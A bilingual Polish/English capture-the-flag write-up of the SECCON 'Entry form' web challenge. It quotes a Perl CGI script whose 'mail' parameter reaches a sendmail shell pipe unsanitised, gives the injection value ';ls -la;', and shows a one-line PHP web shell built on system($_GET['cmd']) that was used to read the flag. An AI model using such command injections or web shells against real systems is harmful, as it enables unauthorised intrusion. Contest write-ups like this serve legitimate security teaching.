##Entry form (Web/Network, 100p)

```
http://entryform.pwn.seccon.jp/register.cgi

(Do not use your real mail address.)
```

###PL
[ENG](#eng-version)

Formularz pod podanym linkiem pozwalał nam na podanie adresu e-mail oraz nazwy użytkownika. Po wysłaniu podziękował nam za podanie informacji, ale w rzeczywistości niczego nie wysyłał. Krótka zabawa z modyfikacją wartości niczego nam nie dała więc postanowiliśmy się rozejrzeć. Okazało się, że serwer webowy ma włączone listowanie i pod `http://entryform.pwn.seccon.jp/` znaleźliśmy dodatkowo katalog `SECRETS` oraz plik `register.cgi_bak`. Pierwszy katalog nie był dostępny, ale drugi z plików dał nam kod źródłowy naszego formularza.

Najciekawsza część wyglądała następująco:

```perl
if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
  close(SH);

  open(LOG, ">>log"); ### <-- FLAG HERE ###
  flock(LOG, 2);
  seek(LOG, 0, 2);
  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
  close(LOG);

  print "<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>";
  exit;
}
```

Jest to skrypt w Perlu, w którym od razu rzuca się w oczy możliwość wywołania własnego polecenia zawierając go w parametrze `mail`.

Potwierdza nam to wysłanie `';ls -la;'`. Według kodu źródłowego flagę mamy znaleźć w pliku `log`. Niestety wygląda na to, że skrypt perlowy nie ma praw do jego odczytania. W takim razie sprawdziliśmy co znajdowało się w uprzednio niedostępnym dla nas katalogu `SECRETS`. Znajdował się tam plik `backdoor123.php` o prostym kodzie: `<pre><?php system($_GET['cmd']); ?></pre>`. Wywołanie w nim polecenia `cat ../log` dało nam flagę:

`SECCON{Glory_will_shine_on_you.}`

### ENG version

Opening the provided link gave us a form asking for an e-mail and a username. After submitting it displayed a thank you message, but didn't really sent us anything. After some time playing with the values we decided to look around. It turned out that the webserver had listing enabled and going to `http://entryform.pwn.seccon.jp/` gave us a `SECRETS` directory and a `register.cgi_bak` file. The former wasn't available, but the latter file gave us a source code of our form.

The most interesing part was the following:

```perl
if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
  close(SH);

  open(LOG, ">>log"); ### <-- FLAG HERE ###
  flock(LOG, 2);
  seek(LOG, 0, 2);
  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
  close(LOG);

  print "<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>";
  exit;
}
```

It's a Perl script and the first thing that comes to mind is the possibility of a bash command injection in the `mail` parameter.

We confirm it by sending `';ls -la;'`. According to the source code we were supposed to find the flag in the `log` file. Unfortunately it seemed that the Perl script didn't have a read access. In that case we tried accessing the previousely inaccessible `SECRETS` directory. There was a `backdoor123.php` file with a very simple source code: `<pre><?php system($_GET['cmd']); ?>`. Invoking a `cat ../log` gave us the flag:

`SECCON{Glory_will_shine_on_you.}`
